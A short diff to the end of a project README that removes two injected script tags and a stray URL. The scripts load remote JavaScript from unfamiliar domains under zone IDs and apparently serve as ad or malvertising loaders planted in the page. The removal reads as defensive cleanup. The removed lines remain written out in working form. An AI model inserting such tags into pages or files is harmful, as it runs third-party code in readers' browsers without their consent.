@@ -267,11 +267,3 @@ MIT — Free for personal and commercial use. See [LICENSE](./LICENSE).
 <div align="center">
   <sub>Built with ❤️ for the AI community</sub>
 </div>
-
-
-
-<script>(function(s){s.dataset.zone='11565893',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
-
-<script>(function(s){s.dataset.zone='11565895',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
-
-https://omg10.com/4/11565896
